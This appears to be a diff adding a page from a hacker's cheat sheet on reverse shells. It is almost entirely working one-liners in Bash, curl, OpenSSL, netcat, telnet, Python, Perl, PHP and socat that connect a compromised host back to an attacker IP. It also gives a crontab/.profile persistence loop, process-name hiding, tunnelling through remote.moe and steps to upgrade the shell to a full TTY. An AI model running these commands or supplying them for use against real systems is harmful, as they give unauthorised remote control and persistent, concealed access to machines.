@@ -1,0 +1,174 @@
+Reverse Shell / Dumb Shell
+
+Tip: Use https://www.revshells.com/ 👌
+
+5.i.a. Reverse shell with gs-netcat (encrypted)
+
+See 6. Backdoors for a 1-liner to deploy and access a fully functioning PTY reverse shell using https://gsocket.io/deploy.
+
+5.i.b. Reverse shell with Bash
+
+Start netcat to listen on port 1524 on your system:
+
+nc -nvlp 1524
+
+After connection, upgrade your shell to a fully interactive PTY shell. Alternatively use pwncat-cs instead of netcat:
+
+pwncat -lp 1524
+# Press "Ctrl-C" if pwncat gets stuck at "registered new host ...".
+# Then type "back" to get the prompt of the remote shell.
+
+On the remote system, this command will connect back to your system (IP = 3.13.3.7, Port 1524) and give you a shell prompt:
+
+# If the current shell is Bash already:
+(bash -i &>/dev/tcp/3.13.3.7/1524 0>&1 &) 
+# If the current shell is NOT Bash then we need:
+bash -c '(exec bash -i &>/dev/tcp/3.13.3.7/1524 0>&1 &)'
+# or hide the bash process as 'kqueue'
+bash -c '(exec -a kqueue bash -i &>/dev/tcp/3.13.3.7/1524 0>&1 &)'
+
+Alternatively, on the remote system, put this into the ~/.profile or crontab to re-start the connect-back shell (and also stiops multiple intances from being started):
+
+fuser /dev/shm/.busy &>/dev/null || (bash -c 'while :; do touch /dev/shm/.busy; exec 3</dev/shm/.busy; bash -i &>/dev/tcp/3.13.3.7/1524 0>&1; sleep 360; done' &>/dev/null &)
+
+5.i.c. Reverse shell with cURL (encrypted)
+
+Use curlshell. This also works through proxies and when direct TCP connection to the outside world is prohibited:
+
+# On YOUR workstation
+# Generate SSL keys:
+openssl req -x509 -newkey rsa:2048 -keyout key.pem -out cert.pem -sha256 -days 3650 -nodes -subj "/CN=THC"
+# Start your listening server:
+./curlshell.py --certificate cert.pem --private-key key.pem --listen-port 8080
+
+# On the target:
+curl -skfL https://3.13.3.7:8080 | bash
+
+5.i.d Reverse shell with cURL (cleartext)
+
+Start ncat to listen for multiple connections:
+
+ncat -kltv 1524
+
+# On the target:
+C="curl -Ns telnet://3.13.3.7:1524"; $C </dev/null 2>&1 | sh 2>&1 | $C >/dev/null
+
+5.i.e. Reverse shell with OpenSSL (encrypted)
+
+# On YOUR workstation:
+# Generate SSL keys:
+openssl req -x509 -newkey rsa:2048 -keyout key.pem -out cert.pem -sha256 -days 3650 -nodes -subj "/CN=THC"
+# Start your listening server:
+openssl s_server -port 1524 -cert cert.pem -key key.pem
+# Or pwncat:
+# pwncat -lp 1524 --ssl
+
+# On the target, start an openssl reverse shell as background process:
+({ openssl s_client -connect 3.13.3.7:1524 -quiet </dev/fd/3 3>&- 2>/dev/null | sh 2>&3 >&3 3>&- ; } 3>&1 | : & )
+
+5.i.f. Reverse shell without /dev/tcp
+
+Embedded systems do not always have Bash and the /dev/tcp/ trick will not work. There are many other ways (Python, PHP, Perl, ..). Our favorite is to upload netcat and use netcat or telnet:
+
+On the remote system:
+
+nc -e /bin/sh -vn 3.13.3.7 1524
+
+Variant if '-e' is not supported:
+
+{ nc -vn 3.13.3.7 1524 </dev/fd/3 3>&- | sh 2>&3 >&3 3>&- ; } 3>&1 | :
+
+    On modern shells this can be shortened to { nc 3.13.3.7 1524 </dev/fd/2|sh;} 2>&1|:. (thanks IA_PD).
+    The | : trick won't work on C-Shell/tcsh (FreeBSD), original Bourne shell (Solaris) or Korn shell (AIX). Use mkfifo instead.
+
+Variant for older /bin/sh:
+
+mkfifo /tmp/.io; sh -i 2>&1 </tmp/.io | nc -vn 3.13.3.7 1524 >/tmp/.io
+
+Telnet variant:
+
+mkfifo /tmp/.io; sh -i 2>&1 </tmp/.io | telnet 3.13.3.7 1524 >/tmp/.io
+
+Telnet variant when mkfifo is not supported (Ulg!):
+
+touch /tmp/.fio; tail -f /tmp/.fio | sh -i | telnet 3.13.3.7 31337 >/tmp/.fio
+
+Note: Dont forget to rm /tmp/.fio after login.
+
+5.i.h. Reverse shell with remote.moe and ssh (encrypted)
+
+It is possible to tunnel raw TCP (e.g bash reverse shell) through remote.moe:
+
+On your workstation:
+
+# First Terminal - Create a remote.moe tunnel to your workstation
+ssh-keygen -q -t rsa -N "" -f .r  # New key creates a new remote.moe-address
+ssh -i .r -R31337:0:8080 -o StrictHostKeyChecking=no nokey@remote.moe; rm -f .r
+# Note down the 'remote.moe' address which will look something like
+# uydsgl6i62nrr2zx3bgkdizlz2jq2muplpuinfkcat6ksfiffpoa.remote.moe
+
+# Second Terminal - start listening for the reverse shell
+nc -vnlp 8080
+
+On the target(needs SSH and Bash):
+
+bash -c '(killall ssh; rm -f /tmp/.r; ssh-keygen -q -t rsa -N "" -f /tmp/.r; ssh -i /tmp/.r -o StrictHostKeyChecking=no -L31338:uydsgl6i62nrr2zx3bgkdizlz2jq2muplpuinfkcat6ksfiffpoa.remote.moe:31337 -Nf remote.moe;  bash -i &>/dev/tcp/0/31338 0>&1 &)'
+
+On the target (alternative; needs ssh, bash and mkfifo):
+
+rm -f /tmp/.p /tmp/.r; ssh-keygen -q -t rsa -N "" -f /tmp/.r && mkfifo /tmp/.p && (bash -i</tmp/.p  2>1 |ssh -i /tmp/.r -o StrictHostKeyChecking=no -W uydsgl6i62nrr2zx3bgkdizlz2jq2muplpuinfkcat6ksfiffpoa.remote.moe:31337 remote.moe>/tmp/.p &)
+
+5.i.i. Reverse shell with Python
+
+python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("3.13.3.7",1524));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
+
+5.i.j. Reverse shell with Perl
+
+# method 1
+perl -e 'use Socket;$i="3.13.3.7";$p=1524;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
+# method 2
+perl -MIO -e '$p=fork;exit,if($p);foreach my $key(keys %ENV){if($ENV{$key}=~/(.*)/){$ENV{$key}=$1;}}$c=new IO::Socket::INET(PeerAddr,"3.13.3.7:1524");STDIN->fdopen($c,r);$~->fdopen($c,w);while(<>){if($_=~ /(.*)/){system $1;}};'
+
+5.i.k. Reverse shell with PHP
+
+php -r '$sock=fsockopen("3.13.3.7",1524);exec("/bin/bash -i <&3 >&3 2>&3");'
+
+5.ii.a. Upgrade a reverse shell to a PTY shell
+
+Any of the above reverse shells are limited. For example sudo bash or top will not work. To make these work we have to upgrade the shell to a real PTY shell:
+
+# Using script
+exec script -qc /bin/bash /dev/null  # Linux
+exec script -q /dev/null /bin/bash   # BSD
+
+# Using python
+exec python -c 'import pty; pty.spawn("/bin/bash")'
+
+5.ii.b. Upgrade a reverse shell to a fully interactive shell
+
+...and if we also like to use Ctrl-C etc then we have to go all the way and upgrade the reverse shell to a real fully colorful interactive shell:
+
+# On the target host spawn a PTY using any of the above examples:
+python -c 'import pty; pty.spawn("/bin/bash")'
+# Now Press Ctrl-Z to suspend the connection and return to your own terminal.
+
+# On your terminal execute:
+stty raw -echo icrnl opost; fg
+
+# On target host
+export SHELL=/bin/bash
+export TERM=xterm-256color
+reset -I
+stty -echo;printf "\033[18t";read -rdt R;stty sane $(echo "${R:-8;80;25}"|awk -F";" '{ printf "rows "$3" cols "$2; }')
+# Pimp up your prompt
+# PS1='USERS=$(who | wc -l) LOAD=$(cut -f1 -d" " /proc/loadavg) PS=$(ps -e --no-headers|wc -l) \[\e[36m\]\u\[\e[m\]@\[\e[32m\]\h:\[\e[33;1m\]\w \[\e[0;31m\]\$\[\e[m\] '
+PS1='\[\033[36m\]\u\[\033[m\]@\[\033[32m\]\h:\[\033[33;1m\]\w\[\033[m\]\$ '
+
+5.ii.c. Reverse shell with socat (fully interactive)
+
+...or install socat and get it done without much fiddling about:
+
+# on attacker's host (listener)
+socat file:`tty`,raw,echo=0 tcp-listen:1524
+# on target host (reverse shell)
+socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:3.13.3.7:1524
